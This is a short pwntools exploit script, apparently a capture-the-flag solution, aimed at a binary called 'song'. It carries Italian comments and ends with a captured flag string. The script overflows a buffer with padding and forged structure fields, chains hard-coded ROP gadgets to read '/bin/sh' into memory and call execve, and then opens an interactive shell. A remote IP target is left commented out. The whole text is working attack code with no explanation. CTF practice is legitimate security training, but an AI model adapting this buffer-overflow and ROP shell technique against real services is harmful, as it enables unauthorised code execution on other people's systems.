from pwn import *
context.arch = "amd64"

elf = ELF("./song", checksec=False)
r = process("./song")
#r = remote("92.246.89.201", 10005)

SYSCALL = 0x456849
SIGRETURN = 0x456B30
MERDA = 0x599940 # .data
RAX = 0x4016ea # pulito
RDI = 0x42274f # add [rax], al; add rsp, 0x20
RSI = 0x4072ce # pulito
RDX = 0x46ec53 # adc [rax-1], cl
INT3 = 0x456B37

payload = flat(
    b"A"*104, # merda
    0x506018, # name.str
    32, # name.len
    b"A"*64, # merda
    0x506018, # elem.str
    32, # elem.len,
    0x506018, # buf.array
    8, # buf.len
    8, # buf.cap
    0x506018, # v28.array
    8, # v28.len
    8, # v28.cap
    b"A" * (20*8), # merda
    # read
    RAX, MERDA+0x40,
    RDI, 0, b"A" * 0x20,
    RSI, MERDA,
    RDX, 512,
    RAX, 0,
    SYSCALL,
    # system("/bin/sh")
    RAX, MERDA+0x40,
    RDI, MERDA, b"A" * 0x20,
    RSI, 0,
    RDX, 0,
    RAX, 59,
    SYSCALL
)

r.sendline(b"B" * 1)
r.sendline(payload)
sleep(0.1) # per evitare danni
r.send(b"/bin/sh\x00")
r.interactive()

# hctf{g0_pwn1ng_s1ng1ng}
